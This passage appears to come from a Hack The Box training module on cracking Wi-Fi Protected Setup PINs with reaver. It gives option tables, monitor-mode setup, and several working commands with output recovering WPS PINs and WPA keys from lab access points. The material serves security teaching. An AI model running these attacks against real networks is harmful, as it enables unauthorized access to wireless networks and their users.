[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is an excellent tool for conducting online password cracking attempts. It offers various options, including Null PIN attacks, custom PIN associations, Pixie Dust Attacks, and general brute-forcing. We will explore Pixie Dust Attacks in detail in the later section. In this section, we will focus on brute-forcing WPS PINs using reaver.
### Reaver Usage

```usage
reaver -i [interface] -b [BSSID] -c [channel]
```

|**Option**|**Description**|
|---|---|
|`-i`|Name of the monitor-mode interface to use|
|`-b`|BSSID of the target AP|
|`-c`|Set the 802.11 channel for the interface|
|`-p`|Use the specified pin|
|`-d`|Set the delay between pin attempts|
|`-l`|Set the time to wait if the AP locks WPS pin attempts|
|`-g`|Quit after num pin attempts|
|`-r`|Sleep for y seconds every x pin attempts|
|`-t`|Set the receive timeout period|
|`-L`|Ignore locked state reported by the target AP|
|`-K, -Z`|Run pixiedust attack|
|`-O`|Write packets of interest into pcap file|
### Brute-forcing WPS PIN

```sh
3kjS@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

3kjS@htb[/htb]$ ifconfig mon0 up

3kjS@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

```sh
3kjS@htb[/htb]$ airodump-ng mon0 --wps
```
![](Screenshot%202026-09-21%20at%2008.16.27.png)

```sh
3kjS@htb[/htb]$ reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1 

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from AE:EB:B0:11:A0:1E
[+] Received beacon from AE:EB:B0:11:A0:1E
[!] Found packet with bad FCS, skipping...
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] WPS PIN: '96457896'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackMe'
```
### Bruteforcing using half known WPS PIN

```sh
3kjS@htb[/htb]$ reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234
```
![](Screenshot%202026-09-21%20at%2008.18.12.png)
### Testing for Null PIN

We can do so by employing the following command, specifying the Null PIN with `-p ""` or `-p " "`.

```sh
3kjS@htb[/htb]$ reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
```
![](Screenshot%202026-09-21%20at%2008.19.02.png)
### Retrieving WPA-PSK using Reaver with a Known PIN

In this command, `-p` specifies the PIN, and `-b` specifies the BSSID of the target Wi-Fi network:

```sh
3kjS@htb[/htb]$ sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197

<snip>
[+] Pin Cracked in 5 seconds
[+] WPS PIN: '88766197'
[+] WPS PSK: 'WPS-Attacks'
[+] AP SSID: 'HTB-Wireless'
```
